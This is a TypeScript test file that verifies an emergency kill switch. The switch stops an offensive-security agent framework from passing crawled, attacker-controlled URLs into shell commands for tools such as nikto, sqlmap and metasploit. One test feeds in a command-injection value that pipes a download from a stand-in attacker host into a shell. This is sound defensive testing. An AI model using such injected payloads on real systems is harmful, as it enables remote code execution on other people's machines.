/**
 * RCE stopgap verification (2026-07-21) — proves the crawlDerivedToolsEnabled()
 * kill switch in layer5-meta-agents.ts actually blocks shell exec, not just that
 * the flag exists. Per the incident: runCrawl() harvests unfiltered href/src/action
 * values from the TARGET's own HTML, persists them to missionMemory, and they
 * re-emerge as `target` fed into whatweb/nikto/nuclei/sqlmap/metasploit/hydra/
 * hashcat via shell-string exec() with no or weak escaping — a hostile target can
 * reach a shell on the operator's machine through ordinary recon->crawl->scan.
 *
 * Every one of the 9 gated call sites is proven here: with the flag OFF, exec()
 * is never invoked (checked via a promisify.custom-backed child_process mock, so
 * we see every real command execAsync would have issued) and a disabled: true
 * result is returned instead. With the flag ON, the same call reaches exec().
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

const { execImpl } = vi.hoisted(() => ({
  execImpl: vi.fn(async (_cmd: string) => ({ stdout: '', stderr: '' })),
}));

vi.mock('child_process', () => {
  function exec(cmd: string, optsOrCb: any, cb?: any) {
    const callback = typeof optsOrCb === 'function' ? optsOrCb : cb;
    execImpl(cmd).then(
      (r: any) => callback(null, r.stdout, r.stderr),
      (e: any) => callback(e),
    );
  }
  (exec as any)[Symbol.for('nodejs.util.promisify.custom')] = execImpl;
  return { exec };
});

import {
  ReconAgent, ScannerAgent, ExploitMetaAgent, SupportMetaAgent,
} from '../lib/orchestration/layer5-meta-agents';

const TARGET = 'http://example.test/path';

let prevRealTools: string | undefined;
let prevFlag: string | undefined;

beforeEach(() => {
  prevRealTools = process.env.REAL_TOOLS;
  prevFlag = process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS;
  process.env.REAL_TOOLS = 'true'; // the vulnerable branch only exists when "real" mode is on
  delete process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS;
  execImpl.mockClear();
});
afterEach(() => {
  process.env.REAL_TOOLS = prevRealTools;
  process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS = prevFlag;
});

describe('RCE stopgap — crawlDerivedToolsEnabled() gate (flag OFF, default)', () => {
  it('runCrawl (taint source) never execs and reports disabled', async () => {
    const agent: any = new ReconAgent();
    const r = await agent.runCrawl(TARGET);
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect(r.result.disabled).toBe(true);
  });

  it('runWhatweb never execs and reports disabled', async () => {
    const agent: any = new ReconAgent();
    const r = await agent.runWhatweb(TARGET);
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect(r.result.disabled).toBe(true);
  });

  it('runNikto never execs and reports disabled', async () => {
    const agent: any = new ScannerAgent();
    const r = await agent.runNikto(TARGET, 'balanced');
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect(r.result.disabled).toBe(true);
  });

  it('runNuclei never execs and reports disabled', async () => {
    const agent: any = new ScannerAgent();
    const r = await agent.runNuclei(TARGET, {}, 'balanced');
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect(r.result.disabled).toBe(true);
  });

  it('runSqlmap (ScannerAgent) never execs and reports disabled', async () => {
    const agent: any = new ScannerAgent();
    const r = await agent.runSqlmap(`${TARGET}?id=1`, {}, 'balanced');
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect(r.result.disabled).toBe(true);
  });

  it("ExploitMetaAgent 'sqlmap' never execs and reports disabled", async () => {
    const agent = new ExploitMetaAgent();
    const r = await agent.execute('a1', { tool: 'sqlmap', target: `${TARGET}?id=1`, parameters: {} });
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect((r.result as any).disabled).toBe(true);
  });

  it("ExploitMetaAgent 'metasploit' never execs and reports disabled", async () => {
    const agent = new ExploitMetaAgent();
    const r = await agent.execute('a1', { tool: 'metasploit', target: TARGET, parameters: {} });
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect((r.result as any).disabled).toBe(true);
  });

  it("SupportMetaAgent 'hydra' never execs and reports disabled", async () => {
    const agent = new SupportMetaAgent();
    const r = await agent.execute('a1', { tool: 'hydra', target: TARGET, parameters: {} });
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect((r.result as any).disabled).toBe(true);
  });

  it("SupportMetaAgent 'hashcat' never execs and reports disabled", async () => {
    const agent = new SupportMetaAgent();
    const r = await agent.execute('a1', { tool: 'hashcat', target: TARGET, parameters: {} });
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.real).toBe(false);
    expect((r.result as any).disabled).toBe(true);
  });

  it('a target crafted with shell metacharacters still never reaches exec()', async () => {
    const hostile = 'http://example.test/$(curl attacker.test/s|sh)#';
    const agent: any = new ReconAgent();
    const r = await agent.runWhatweb(hostile);
    expect(execImpl).not.toHaveBeenCalled();
    expect(r.result.disabled).toBe(true);
  });
});

describe('RCE stopgap — flag ON (ALLOW_UNSAFE_SHELL_RECON_TOOLS=true) genuinely re-enables dispatch', () => {
  beforeEach(() => {
    process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS = 'true';
  });

  it('runWhatweb reaches exec() when explicitly overridden', async () => {
    const agent: any = new ReconAgent();
    await agent.runWhatweb(TARGET);
    expect(execImpl).toHaveBeenCalled();
  });

  it("ExploitMetaAgent 'metasploit' reaches exec() when explicitly overridden", async () => {
    const agent = new ExploitMetaAgent();
    await agent.execute('a1', { tool: 'metasploit', target: TARGET, parameters: {} });
    expect(execImpl).toHaveBeenCalled();
  });
});
